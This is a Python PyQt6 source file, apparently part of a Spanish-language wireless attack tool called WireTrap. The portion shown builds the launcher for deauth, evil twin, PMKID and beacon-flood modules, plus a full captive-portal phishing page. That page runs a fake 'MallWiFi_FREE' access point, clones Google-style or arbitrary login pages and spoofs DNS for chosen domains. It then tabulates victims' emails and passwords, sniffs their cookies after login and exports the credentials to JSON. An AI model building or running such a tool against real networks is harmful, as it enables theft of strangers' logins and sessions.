import sys
import os
# test commit github desktop - ok
WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout,
    QHBoxLayout, QTableWidget, QTableWidgetItem, QPushButton,
    QLabel, QComboBox, QHeaderView, QFrame, QSplitter,
    QTextEdit, QGroupBox, QMessageBox, QLineEdit,
    QStackedWidget, QCheckBox, QSlider, QAbstractItemView
)
from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
from PyQt6.QtGui import QColor, QFont

from core.scanner import Scanner, AccessPoint, Client
from core.deauth import Deauther
from core.evil_twin import EvilTwin
from core.beacon_flood import BeaconFlooder
from core.captive_portal import CaptivePortal
from core.wpa2_crypto import WPA2Crypto
from core.decision_engine import DecisionEngine, AttackTechnique
from gui.dashboard_dialog import DashboardDialog
from post_exploitation.sniffer import WireTrapSniffer

# ── Bridge para emitir señales desde threads externos ─────────

class SignalBridge(QObject):
    ap_found         = pyqtSignal(object)
    client_found     = pyqtSignal(object)
    log_message      = pyqtSignal(str)
    client_joined    = pyqtSignal(str)
    attack_stopped   = pyqtSignal()
    et_client_detail = pyqtSignal(str, str, str, str)  # mac, ip, hostname, hora
    data_captured    = pyqtSignal(object)
    pmkid_success    = pyqtSignal(str)
    pmkid_error      = pyqtSignal(str)
    wpa2_log_message = pyqtSignal(str)
    flood_beacon_sent = pyqtSignal(int)
    flood_stopped    = pyqtSignal()
    cp_log           = pyqtSignal(str)
    cp_credential    = pyqtSignal(object)   # dict
    cp_sniff_data    = pyqtSignal(object)   # CapturedData post-login
    cp_started       = pyqtSignal()
    cp_stopped       = pyqtSignal()
    cp_clone_ok      = pyqtSignal()
    cp_clone_fail    = pyqtSignal()


# ── Ventana principal ─────────────────────────────────────────

class WireTrap(QMainWindow):

    def __init__(self):
        super().__init__()
        self.setWindowTitle("WireTrap v1.0 — Wireless Red Team Framework")
        self.setMinimumSize(1300, 820)
        self.resize(1600, 950)

        # Estado interno
        self.selected_ap     = None
        self.selected_client = None
        self.attack_plan     = None
        self.attacking       = False

        # Módulos core
        self.scanner  = None
        self.deauther = None
        self.evil_twin = None
        self.sniffer  = None
        self.wpa2_engine = None
        self.flooder  = None
        self.captive_portal = None
        self.engine   = DecisionEngine()

        self.dashboards = []

        # Bridge de señales
        self.bridge = SignalBridge()
        self.bridge.ap_found.connect(self._on_ap_found)
        self.bridge.client_found.connect(self._on_client_found)
        self.bridge.log_message.connect(self.log)
        self.bridge.client_joined.connect(self._on_client_joined)
        self.bridge.attack_stopped.connect(self._on_attack_stopped)
        self.bridge.et_client_detail.connect(self._on_et_client_detail)
        self.bridge.data_captured.connect(self._on_data_captured)
        self.bridge.pmkid_success.connect(self._on_pmkid_success)
        self.bridge.pmkid_error.connect(self._on_pmkid_error)
        self.bridge.wpa2_log_message.connect(self.log_wpa2)
        self.bridge.flood_beacon_sent.connect(self._on_flood_beacon_sent)
        self.bridge.flood_stopped.connect(self._on_flood_stopped)
        self.bridge.cp_log.connect(self._on_cp_log)
        self.bridge.cp_clone_ok.connect(self._on_clone_success)
        self.bridge.cp_clone_fail.connect(self._on_clone_error)
        self.bridge.cp_credential.connect(self._on_cp_credential)
        self.bridge.cp_sniff_data.connect(self._on_cp_sniff_data)
        self.bridge.cp_started.connect(self._on_cp_started)
        self.bridge.cp_stopped.connect(self._on_cp_stopped)

        # Timer para refrescar señal y contadores de la tabla de APs
        self._refresh_timer = QTimer(self)
        self._refresh_timer.setInterval(2000)
        self._refresh_timer.timeout.connect(self._refresh_ap_table)

        self.setup_ui()
        self.apply_styles()
        self._populate_interfaces()

    # ── UI ────────────────────────────────────────────────────

    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_base_layout = QVBoxLayout(central)
        main_base_layout.setContentsMargins(0, 0, 0, 0)

        self.stack = QStackedWidget()
        main_base_layout.addWidget(self.stack)

        self.page_launcher = QWidget()
        self._setup_launcher_ui(self.page_launcher)
        self.stack.addWidget(self.page_launcher)

        self.page_deauth = QWidget()
        self._setup_deauth_ui(self.page_deauth)
        self.stack.addWidget(self.page_deauth)

        self.page_wpa2 = QWidget()
        self._setup_wpa2_ui(self.page_wpa2)
        self.stack.addWidget(self.page_wpa2)

        self.page_flood = QWidget()
        self._setup_flood_ui(self.page_flood)
        self.stack.addWidget(self.page_flood)

        self.page_captive = QWidget()
        self._setup_captive_ui(self.page_captive)
        self.stack.addWidget(self.page_captive)

        self.stack.setCurrentIndex(0)

    def _setup_launcher_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        title = QLabel("🔴 WireTrap v1.0")
        title.setFont(QFont("Monospace", 32, QFont.Weight.Bold))
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color: #ff3333; margin-bottom: 30px;")
        layout.addWidget(title)

        subtitle = QLabel("Selecciona un Módulo de Ataque")
        subtitle.setFont(QFont("Monospace", 14))
        subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
        subtitle.setStyleSheet("color: #aaaaaa; margin-bottom: 40px;")
        layout.addWidget(subtitle)

        grid = QVBoxLayout()
        grid.setSpacing(15)

        btn_deauth_et = QPushButton("💥 Deauth + Evil Twin")
        btn_deauth_et.setFixedHeight(60)
        btn_deauth_et.setFixedWidth(400)
        btn_deauth_et.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_deauth_et.setStyleSheet("background-color: #331111; border: 2px solid #e94560; color: white;")
        btn_deauth_et.clicked.connect(lambda: self.stack.setCurrentIndex(1))

        btn_pmkid = QPushButton("🔒 Criptografía WPA2 (PMKID/Handshakes)")
        btn_pmkid.setFixedHeight(60)
        btn_pmkid.setFixedWidth(400)
        btn_pmkid.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_pmkid.setStyleSheet("background-color: #113311; border: 2px solid #00aa44; color: white;")
        btn_pmkid.clicked.connect(lambda: self.stack.setCurrentIndex(2))

        btn_flood = QPushButton("📡 Beacon Flood (Saturación de APs)")
        btn_flood.setFixedHeight(60)
        btn_flood.setFixedWidth(400)
        btn_flood.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_flood.setStyleSheet("background-color: #111133; border: 2px solid #5588ff; color: white;")
        btn_flood.clicked.connect(lambda: self.stack.setCurrentIndex(3))

        btn_captive = QPushButton("🎣 Captive Portal (Evil Twin Público)")
        btn_captive.setFixedHeight(60)
        btn_captive.setFixedWidth(400)
        btn_captive.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        btn_captive.setStyleSheet("background-color: #1a1100; border: 2px solid #ff8800; color: white;")
        btn_captive.clicked.connect(lambda: self.stack.setCurrentIndex(4))

        grid.addWidget(btn_deauth_et, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_pmkid, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_flood, alignment=Qt.AlignmentFlag.AlignCenter)
        grid.addWidget(btn_captive, alignment=Qt.AlignmentFlag.AlignCenter)

        layout.addLayout(grid)

    # ── Captive Portal UI ─────────────────────────────────────────

    def _setup_captive_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setSpacing(8)
        layout.setContentsMargins(10, 10, 10, 10)

        # Header
        header = QHBoxLayout()
        btn_back = QPushButton("⬅ Volver al Menú")
        btn_back.setFixedWidth(150)
        btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(btn_back)
        header.addSpacing(20)

        title = QLabel("🎣 WireTrap: Captive Portal — Evil Twin Público")
        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        title.setStyleSheet("color: #ff8800;")
        header.addWidget(title)
        header.addStretch()

        self.cp_iface_label = QLabel("Interfaz (managed):")
        self.cp_iface_combo = QComboBox()
        self.cp_iface_combo.setFixedWidth(140)
        header.addWidget(self.cp_iface_label)
        header.addWidget(self.cp_iface_combo)
        header.addSpacing(16)

        self.cp_status_label = QLabel("● IDLE")
        self.cp_status_label.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.cp_status_label.setStyleSheet("color: gray; font-weight: bold;")
        header.addWidget(self.cp_status_label)

        layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        layout.addWidget(line)

        center = QHBoxLayout()

        # ── Panel izquierdo: configuración ───────────────────────
        opts_group = QGroupBox("CONFIGURACIÓN DEL PORTAL")
        opts_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        opts_group.setFixedWidth(360)
        opts_layout = QVBoxLayout(opts_group)
        opts_layout.setSpacing(14)

        # SSID
        ssid_row = QHBoxLayout()
        ssid_label = QLabel("SSID del AP:")
        ssid_label.setFont(QFont("Monospace", 10))
        self.cp_ssid_input = QLineEdit("MallWiFi_FREE")
        self.cp_ssid_input.setFont(QFont("Monospace", 10))
        ssid_row.addWidget(ssid_label)
        ssid_row.addWidget(self.cp_ssid_input)
        opts_layout.addLayout(ssid_row)

        # Canal
        ch_row = QHBoxLayout()
        ch_label = QLabel("Canal WiFi:")
        ch_label.setFont(QFont("Monospace", 10))
        self.cp_channel_combo = QComboBox()
        self.cp_channel_combo.addItems([str(i) for i in range(1, 14)])
        self.cp_channel_combo.setCurrentText("6")
        self.cp_channel_combo.setFixedWidth(70)
        ch_row.addWidget(ch_label)
        ch_row.addStretch()
        ch_row.addWidget(self.cp_channel_combo)
        opts_layout.addLayout(ch_row)

        # Plantilla de portal
        tpl_label = QLabel("Plantilla de login:")
        tpl_label.setFont(QFont("Monospace", 10))
        opts_layout.addWidget(tpl_label)
        self.cp_template_combo = QComboBox()
        self.cp_template_combo.addItems(["Google", "Personalizada (URL)"])
        self.cp_template_combo.setFont(QFont("Monospace", 10))
        opts_layout.addWidget(self.cp_template_combo)

        tpl_hint = QLabel(
            "  Google → página estilo Google\n"
            "  Personalizada → clonar una URL real"
        )
        tpl_hint.setFont(QFont("Monospace", 8))
        tpl_hint.setStyleSheet("color: #888888;")
        opts_layout.addWidget(tpl_hint)

        sep = QFrame()
        sep.setFrameShape(QFrame.Shape.HLine)
        sep.setStyleSheet("color: #333;")
        opts_layout.addWidget(sep)

        # URL para plantilla personalizada (visible solo cuando se elige "Personalizada")
        self.cp_url_label = QLabel("URL a clonar:")
        self.cp_url_label.setFont(QFont("Monospace", 10))
        self.cp_url_input = QLineEdit()
        self.cp_url_input.setFont(QFont("Monospace", 9))
        self.cp_url_input.setPlaceholderText("https://login.ejemplo.com/wifi")
        self.btn_cp_clone = QPushButton("🔗 Clonar Plantilla")
        self.btn_cp_clone.setFont(QFont("Monospace", 9, QFont.Weight.Bold))
        self.btn_cp_clone.setStyleSheet(
            "QPushButton { background: #1a0d00; border: 1px solid #ff8800; color: #ff8800; padding: 4px 8px; border-radius: 4px; }"
            "QPushButton:hover { background: #ff8800; color: black; }"
        )
        self.btn_cp_clone.clicked.connect(self._on_cp_clone_clicked)
        self.cp_clone_status = QLabel("")
        self.cp_clone_status.setFont(QFont("Monospace", 8))
        self.cp_clone_status.setStyleSheet("color: #888888;")
        self.cp_clone_status.setWordWrap(True)

        self.cp_url_label.setVisible(False)
        self.cp_url_input.setVisible(False)
        self.btn_cp_clone.setVisible(False)
        self.cp_clone_status.setVisible(False)

        opts_layout.addWidget(self.cp_url_label)
        opts_layout.addWidget(self.cp_url_input)
        opts_layout.addWidget(self.btn_cp_clone)
        opts_layout.addWidget(self.cp_clone_status)

        def _on_template_changed(text):
            is_custom = (text == "Personalizada (URL)")
            self.cp_url_label.setVisible(is_custom)
            self.cp_url_input.setVisible(is_custom)
            self.btn_cp_clone.setVisible(is_custom)
            self.cp_clone_status.setVisible(is_custom)

        self.cp_template_combo.currentTextChanged.connect(_on_template_changed)

        sep2 = QFrame()
        sep2.setFrameShape(QFrame.Shape.HLine)
        sep2.setStyleSheet("color: #333;")
        opts_layout.addWidget(sep2)

        # ── DNS Spoofing ──────────────────────────────────────────
        dns_group = QGroupBox("🌍 DNS SPOOFING POR DOMINIO")
        dns_group.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        dns_group.setStyleSheet(
            "QGroupBox { border: 1px solid #553300; border-radius: 4px; margin-top: 6px; padding-top: 4px; }"
            "QGroupBox::title { color: #ff8800; subcontrol-origin: margin; left: 8px; }"
        )
        dns_inner = QVBoxLayout(dns_group)
        dns_inner.setSpacing(6)

        self.chk_dns_spoof = QCheckBox("Activar DNS Spoofing por dominios específicos")
        self.chk_dns_spoof.setFont(QFont("Monospace", 9))
        self.chk_dns_spoof.setStyleSheet("color: #ff8800;")
        dns_inner.addWidget(self.chk_dns_spoof)

        dns_hint = QLabel(
            "Por cada dominio, indica la URL de login a clonar (opcional).\n"
            "Si dejas la URL vacía, muestra el captive portal genérico."
        )
        dns_hint.setFont(QFont("Monospace", 8))
        dns_hint.setStyleSheet("color: #888888;")
        dns_inner.addWidget(dns_hint)

        # Tabla: Dominio | URL a clonar
        self.dns_spoof_table = QTableWidget()
        self.dns_spoof_table.setColumnCount(2)
        self.dns_spoof_table.setHorizontalHeaderLabels(["Dominio", "URL a clonar (opcional)"])
        self.dns_spoof_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        self.dns_spoof_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self.dns_spoof_table.setFont(QFont("Monospace", 9))
        self.dns_spoof_table.setFixedHeight(120)
        self.dns_spoof_table.setRowCount(3)
        self.dns_spoof_table.setStyleSheet(
            "QTableWidget { background: #0d0d0d; color: #ff8800; border: 1px solid #553300; }"
            "QHeaderView::section { background: #1a0a00; color: #ff8800; border: 1px solid #553300; }"
        )
        for row in range(3):
            self.dns_spoof_table.setItem(row, 0, QTableWidgetItem(""))
            self.dns_spoof_table.setItem(row, 1, QTableWidgetItem(""))
        dns_inner.addWidget(self.dns_spoof_table)

        dns_btn_row = QHBoxLayout()
        btn_dns_add = QPushButton("+ Añadir fila")
        btn_dns_add.setFont(QFont("Monospace", 8))
        btn_dns_add.setFixedHeight(24)
        btn_dns_add.setStyleSheet(
            "QPushButton { background: #1a0a00; color: #ff8800; border: 1px solid #553300; }"
            "QPushButton:hover { background: #2a1400; }"
        )
        btn_dns_del = QPushButton("− Eliminar fila")
        btn_dns_del.setFont(QFont("Monospace", 8))
        btn_dns_del.setFixedHeight(24)
        btn_dns_del.setStyleSheet(
            "QPushButton { background: #1a0a00; color: #ff8800; border: 1px solid #553300; }"
            "QPushButton:hover { background: #2a1400; }"
        )

        def _dns_add_row():
            r = self.dns_spoof_table.rowCount()
            self.dns_spoof_table.insertRow(r)
            self.dns_spoof_table.setItem(r, 0, QTableWidgetItem(""))
            self.dns_spoof_table.setItem(r, 1, QTableWidgetItem(""))

        def _dns_del_row():
            row = self.dns_spoof_table.currentRow()
            if row >= 0:
                self.dns_spoof_table.removeRow(row)

        btn_dns_add.clicked.connect(_dns_add_row)
        btn_dns_del.clicked.connect(_dns_del_row)
        dns_btn_row.addWidget(btn_dns_add)
        dns_btn_row.addWidget(btn_dns_del)
        dns_btn_row.addStretch()
        dns_inner.addLayout(dns_btn_row)

        dns_ip_row = QHBoxLayout()
        dns_ip_lbl = QLabel("IP destino (tu máquina):")
        dns_ip_lbl.setFont(QFont("Monospace", 9))
        self.dns_target_ip = QLineEdit("10.0.0.1")
        self.dns_target_ip.setFont(QFont("Monospace", 9))
        self.dns_target_ip.setFixedWidth(130)
        self.dns_target_ip.setToolTip(
            "IP a la que dnsmasq resolverá los dominios espoofeados.\n"
            "Debe ser la IP de tu máquina (10.0.0.1 por defecto)."
        )
        dns_ip_row.addWidget(dns_ip_lbl)
        dns_ip_row.addWidget(self.dns_target_ip)
        dns_ip_row.addStretch()
        dns_inner.addLayout(dns_ip_row)

        dns_hint.setVisible(False)
        self.dns_spoof_table.setVisible(False)
        btn_dns_add.setVisible(False)
        btn_dns_del.setVisible(False)
        dns_ip_lbl.setVisible(False)
        self.dns_target_ip.setVisible(False)

        def _on_dns_spoof_toggled(checked):
            dns_hint.setVisible(checked)
            self.dns_spoof_table.setVisible(checked)
            btn_dns_add.setVisible(checked)
            btn_dns_del.setVisible(checked)
            dns_ip_lbl.setVisible(checked)
            self.dns_target_ip.setVisible(checked)

        self.chk_dns_spoof.toggled.connect(_on_dns_spoof_toggled)
        opts_layout.addWidget(dns_group)

        sep3 = QFrame()
        sep3.setFrameShape(QFrame.Shape.HLine)
        sep3.setStyleSheet("color: #333;")
        opts_layout.addWidget(sep3)

        # Interfaz de salida (internet real)
        out_label = QLabel("Interfaz internet (post-login):")
        out_label.setFont(QFont("Monospace", 10))
        opts_layout.addWidget(out_label)
        self.cp_out_iface_combo = QComboBox()
        self.cp_out_iface_combo.addItems(["eth0", "wlan0", "wlan1"])
        self.cp_out_iface_combo.setFont(QFont("Monospace", 10))
        opts_layout.addWidget(self.cp_out_iface_combo)
        out_hint = QLabel("  Interfaz con acceso a internet real\n  que se da a la víctima tras el login")
        out_hint.setFont(QFont("Monospace", 8))
        out_hint.setStyleSheet("color: #888888;")
        opts_layout.addWidget(out_hint)

        opts_layout.addStretch()

        # Info técnica
        info = QLabel(
            "Requiere:\n"
            "  • hostapd\n"
            "  • dnsmasq\n"
            "  • python3-flask\n"
            "  • Ejecutar como root"
        )
        info.setFont(QFont("Monospace", 8))
        info.setStyleSheet("color: #666666; border: 1px solid #333; padding: 6px; border-radius: 4px;")
        opts_layout.addWidget(info)

        center.addWidget(opts_group)

        # ── Panel central: credenciales capturadas ───────────────
        right_layout = QVBoxLayout()

        # Tabla de credenciales
        creds_group = QGroupBox("CREDENCIALES CAPTURADAS")
        creds_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        creds_layout = QVBoxLayout(creds_group)

        self.cp_creds_table = QTableWidget()
        self.cp_creds_table.setColumnCount(5)
        self.cp_creds_table.setHorizontalHeaderLabels(
            ["Hora", "IP Víctima", "Dominio", "Email / Usuario", "Contraseña"]
        )
        self.cp_creds_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.ResizeToContents
        )
        self.cp_creds_table.horizontalHeader().setStretchLastSection(True)
        self.cp_creds_table.setEditTriggers(
            QTableWidget.EditTrigger.NoEditTriggers
        )
        self.cp_creds_table.setFont(QFont("Monospace", 9))
        self.cp_creds_table.setStyleSheet(
            "background: #0d0d0d; color: #ff8800; "
            "gridline-color: #333; selection-background-color: #331a00;"
        )
        creds_layout.addWidget(self.cp_creds_table)

        # Exportar
        export_row = QHBoxLayout()
        self.cp_lbl_count = QLabel("0 credenciales capturadas")
        self.cp_lbl_count.setFont(QFont("Monospace", 10))
        self.cp_lbl_count.setStyleSheet("color: #ff8800;")
        self.btn_cp_export = QPushButton("💾 Exportar JSON")
        self.btn_cp_export.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_cp_export.setEnabled(False)
        self.btn_cp_export.clicked.connect(self._on_cp_export_clicked)
        self.btn_cp_export.setStyleSheet(
            "QPushButton { background: #1a0d00; border: 1px solid #ff8800; color: #ff8800; padding: 4px 12px; border-radius: 4px; }"
            "QPushButton:hover { background: #ff8800; color: black; }"
        )
        export_row.addWidget(self.cp_lbl_count)
        export_row.addStretch()
        export_row.addWidget(self.btn_cp_export)
        creds_layout.addLayout(export_row)

        creds_group.setFixedHeight(230)
        right_layout.addWidget(creds_group)

        # Tabla de tráfico post-login (sniffer)
        sniff_group = QGroupBox("TRÁFICO POST-LOGIN (COOKIES / HTTP)")
        sniff_group.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        sniff_layout = QVBoxLayout(sniff_group)
        self.cp_sniff_table = QTableWidget()
        self.cp_sniff_table.setColumnCount(4)
        self.cp_sniff_table.setHorizontalHeaderLabels(["Hora", "IP", "Tipo", "Valor"])
        self.cp_sniff_table.horizontalHeader().setSectionResizeMode(
            QHeaderView.ResizeMode.ResizeToContents)
        self.cp_sniff_table.horizontalHeader().setStretchLastSection(True)
        self.cp_sniff_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.cp_sniff_table.setFont(QFont("Monospace", 8))
        self.cp_sniff_table.setStyleSheet(
            "background: #0d0d0d; color: #00ff88; gridline-color: #222;"
            "QHeaderView::section { background: #1a1a1a; color: #ff8800; }"
        )
        sniff_layout.addWidget(self.cp_sniff_table)
        sniff_group.setFixedHeight(180)
        right_layout.addWidget(sniff_group)

        # Log
        log_group = QGroupBox("LOG DEL ATAQUE")
        log_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        log_inner = QVBoxLayout(log_group)
        self.cp_log_text = QTextEdit()
        self.cp_log_text.setReadOnly(True)
        self.cp_log_text.setFont(QFont("Monospace", 9))
        self.cp_log_text.setStyleSheet(
            "background: #0d0d0d; color: #ff8800; border: 1px solid #333;"
        )
        self.cp_log_text.setPlaceholderText("Los eventos del portal aparecerán aquí...")
        log_inner.addWidget(self.cp_log_text)
        right_layout.addWidget(log_group)

        center.addLayout(right_layout)
        layout.addLayout(center, 1)

        # Botones arranque / parada
        btn_row = QHBoxLayout()
        self.btn_cp_start = QPushButton("🎣  Iniciar Captive Portal")
        self.btn_cp_start.setFixedHeight(44)
        self.btn_cp_start.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        self.btn_cp_start.setStyleSheet(
            "QPushButton { background: #1a0d00; border: 2px solid #ff8800; color: #ff8800; border-radius: 4px; }"
            "QPushButton:hover { background: #ff8800; color: black; }"
        )
        self.btn_cp_start.clicked.connect(self._on_cp_start_clicked)

        self.btn_cp_stop = QPushButton("■  Detener")
        self.btn_cp_stop.setFixedHeight(44)
        self.btn_cp_stop.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
        self.btn_cp_stop.setEnabled(False)
        self.btn_cp_stop.clicked.connect(self._on_cp_stop_clicked)

        btn_row.addWidget(self.btn_cp_start)
        btn_row.addWidget(self.btn_cp_stop)
        layout.addLayout(btn_row)

    # ── Captive Portal: callbacks y slots ─────────────────────────

    def _cp_log(self, msg: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        if "CREDENCIAL" in msg or "[!]" in msg:
            self.cp_log_text.append(
                f"<span style='color:#ff3333; font-weight:bold;'>[{ts}] {msg}</span>"
            )
        else:
            self.cp_log_text.append(f"[{ts}] {msg}")

    def _on_cp_log(self, msg: str):
        self._cp_log(msg)

    def _on_cp_credential(self, entry):
        """Añade una fila a la tabla de credenciales."""
        row = self.cp_creds_table.rowCount()
        self.cp_creds_table.insertRow(row)
        for col, val in enumerate([
            entry.get("timestamp", ""),
            entry.get("ip", ""),
            entry.get("host", "portal"),
            entry.get("email", ""),
            entry.get("password", ""),
        ]):
            item = QTableWidgetItem(val)
            item.setForeground(QColor("#ff8800"))
            self.cp_creds_table.setItem(row, col, item)

        count = self.cp_creds_table.rowCount()
        self.cp_lbl_count.setText(f"{count} credencial{'es' if count != 1 else ''} capturada{'s' if count != 1 else ''}")
        self.btn_cp_export.setEnabled(True)

    def _on_cp_started(self):
        self.cp_status_label.setText("● ACTIVO")
        self.cp_status_label.setStyleSheet("color: #ff8800; font-weight: bold;")
        self.btn_cp_start.setEnabled(False)
        self.btn_cp_stop.setEnabled(True)
        self.cp_ssid_input.setEnabled(False)
        self.cp_channel_combo.setEnabled(False)
        self.cp_template_combo.setEnabled(False)
        self.cp_url_input.setEnabled(False)
        self.btn_cp_clone.setEnabled(False)
        self.cp_iface_combo.setEnabled(False)
        self.cp_out_iface_combo.setEnabled(False)

    def _on_cp_stopped(self):
        self.cp_status_label.setText("● IDLE")
        self.cp_status_label.setStyleSheet("color: gray; font-weight: bold;")
        self.btn_cp_start.setEnabled(True)
        self.btn_cp_stop.setEnabled(False)
        self.cp_ssid_input.setEnabled(True)
        self.cp_channel_combo.setEnabled(True)
        self.cp_template_combo.setEnabled(True)
        self.cp_url_input.setEnabled(True)
        self.btn_cp_clone.setEnabled(True)
        self.cp_iface_combo.setEnabled(True)
        self.cp_out_iface_combo.setEnabled(True)
        self._cp_log("Portal detenido.")

    def _on_cp_clone_clicked(self):
        """Clona la URL indicada y la guarda en el CaptivePortal temporal."""
        url = self.cp_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Introduce una URL válida.")
            return
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            self.cp_url_input.setText(url)

        self.btn_cp_clone.setEnabled(False)
        self.cp_clone_status.setText("⏳ Clonando página... (puede tardar unos segundos)")
        self.cp_clone_status.setStyleSheet("color: #ffcc00;")

        # Crear un CaptivePortal temporal solo para la clonación
        from core.captive_portal import CaptivePortal as _CP
        iface = self.cp_iface_combo.currentText() or "wlan0"
        self._clone_portal = _CP(iface)
        self._clone_portal.on_log = lambda m: self.bridge.cp_log.emit(m)
        self._clone_portal.on_error = lambda m: self.bridge.cp_log.emit(f"[!] {m}")

        def _do_clone():
            ok = self._clone_portal.clone_template(url)
            # Volver al hilo GUI
            if ok:
                self.bridge.cp_log.emit(f"[+] Plantilla clonada desde {url}")
                self.bridge.cp_clone_ok.emit()
            else:
                self.bridge.cp_clone_fail.emit()

        import threading
        threading.Thread(target=_do_clone, daemon=True).start()

    def _on_clone_success(self):
        self.cp_clone_status.setText("✅ Plantilla clonada correctamente")
        self.cp_clone_status.setStyleSheet("color: #00ff88;")
        self.btn_cp_clone.setEnabled(True)

    def _on_clone_error(self):
        self.cp_clone_status.setText("❌ Error al clonar. Revisa la URL y el log.")
        self.cp_clone_status.setStyleSheet("color: #ff4444;")
        self.btn_cp_clone.setEnabled(True)
        self._clone_portal = None

    def _on_cp_start_clicked(self):
        iface = self.cp_iface_combo.currentText()
        if not iface:
            QMessageBox.warning(self, "Error", "Selecciona una interfaz.")
            return

        ssid     = self.cp_ssid_input.text().strip() or "FreeWiFi"
        channel  = int(self.cp_channel_combo.currentText())
        template_text = self.cp_template_combo.currentText()
        template = "google" if template_text == "Google" else "custom"
        out_if   = self.cp_out_iface_combo.currentText()

        # Si es personalizada, comprobar que se ha clonado
        if template == "custom":
            if not hasattr(self, "_clone_portal") or not self._clone_portal or not self._clone_portal.custom_html:
                QMessageBox.warning(self, "Plantilla no lista",
                                    "Primero debes clonar la plantilla usando el botón '🔗 Clonar Plantilla'.")
                return

        # Limpiar tablas previas
        self.cp_creds_table.setRowCount(0)
        self.cp_lbl_count.setText("0 credenciales capturadas")
        self.btn_cp_export.setEnabled(False)
        self.cp_sniff_table.setRowCount(0)

        self.captive_portal = CaptivePortal(iface)
        self.captive_portal.on_log        = lambda m: self.bridge.cp_log.emit(m)
        self.captive_portal.on_error      = lambda m: self.bridge.cp_log.emit(f"[!] ERROR: {m}")
        self.captive_portal.on_credential = lambda e: self.bridge.cp_credential.emit(e)
        self.captive_portal.on_sniff_data = lambda d: self.bridge.cp_sniff_data.emit(d)
        self.captive_portal.on_started    = lambda: self.bridge.cp_started.emit()
        self.captive_portal.on_stopped    = lambda: self.bridge.cp_stopped.emit()

        # Transferir HTML clonado si es plantilla personalizada
        if template == "custom" and hasattr(self, "_clone_portal") and self._clone_portal:
            self.captive_portal.custom_html = self._clone_portal.custom_html
            self.captive_portal.template_type = "custom"

        # Configurar DNS Spoofing si está activado
        if self.chk_dns_spoof.isChecked():
            spoof_entries = []
            for row in range(self.dns_spoof_table.rowCount()):
                cell_domain = self.dns_spoof_table.item(row, 0)
                cell_url    = self.dns_spoof_table.item(row, 1)
                raw_domain  = cell_domain.text().strip() if cell_domain else ""
                clone_url   = cell_url.text().strip()    if cell_url    else ""
                if not raw_domain:
                    continue
                domain = raw_domain.lower()
                for prefix in ("https://", "http://"):
                    if domain.startswith(prefix):
                        domain = domain[len(prefix):]
                domain = domain.split("/")[0]
                spoof_entries.append({
                    "domain":    domain,
                    "clone_url": clone_url,
                    "html":      ""
                })
            target_ip = self.dns_target_ip.text().strip() or "10.0.0.1"
            self.captive_portal.dns_spoof_domains   = spoof_entries
            self.captive_portal.dns_spoof_target_ip = target_ip

        import threading
        t = threading.Thread(
            target=self.captive_portal.start,
            kwargs=dict(ssid=ssid, channel=channel, template=template,
                        out_interface=out_if),
            daemon=True
        )
        t.start()

    def _on_cp_sniff_data(self, data):
        from datetime import datetime
        row = self.cp_sniff_table.rowCount()
        self.cp_sniff_table.insertRow(row)
        ts = datetime.now().strftime("%H:%M:%S")
        values = [ts, data.source_ip, data.data_type, data.value[:120]]
        for col, val in enumerate(values):
            item = QTableWidgetItem(str(val))
            item.setForeground(Qt.GlobalColor.green)
            self.cp_sniff_table.setItem(row, col, item)
        self.cp_sniff_table.scrollToBottom()

    def _on_cp_stop_clicked(self):
        if self.captive_portal:
            import threading
            threading.Thread(target=self.captive_portal.stop, daemon=True).start()

    def _on_cp_export_clicked(self):
        if not self.captive_portal:
            return
        from datetime import datetime
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"/tmp/wiretrap_creds_{ts}.json"
        out  = self.captive_portal.export_credentials(path)
        QMessageBox.information(
            self, "Exportado",
            f"Credenciales guardadas en:\n{out}"
        )

    def _setup_flood_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setSpacing(8)
        layout.setContentsMargins(10, 10, 10, 10)

        # Header
        header = QHBoxLayout()
        btn_back = QPushButton("⬅ Volver al Menú")
        btn_back.setFixedWidth(150)
        btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(btn_back)
        header.addSpacing(20)

        title = QLabel("📡 WireTrap: Beacon Flood — Saturación de APs")
